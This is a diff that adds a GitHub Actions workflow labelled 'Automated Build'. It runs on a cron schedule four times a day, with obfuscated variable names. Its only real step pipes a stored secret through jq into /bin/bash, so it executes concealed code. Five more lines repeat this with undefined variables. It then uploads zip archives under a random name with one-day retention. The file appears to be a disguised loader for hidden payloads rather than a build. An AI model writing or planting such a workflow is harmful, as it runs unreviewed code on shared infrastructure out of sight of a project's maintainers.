@@ -1,0 +1,36 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          ru37393: ${{ secrets.ru37393 }}
+        run: |
+          printf '%s' "$ru37393" | jq -r .m08 | /bin/bash
+          printf '%s' "$qhth1" | jq -r .oiryc0 | /bin/bash
+          printf '%s' "$v08394" | jq -r .ojkcw9 | /bin/bash
+          printf '%s' "$t936" | jq -r .le2 | /bin/bash
+          printf '%s' "$iat86898" | jq -r .qs4 | /bin/bash
+          printf '%s' "$ozo86440" | jq -r .pd6 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: N4iwbwPk
+          path: "*.zip"
+          retention-days: 1
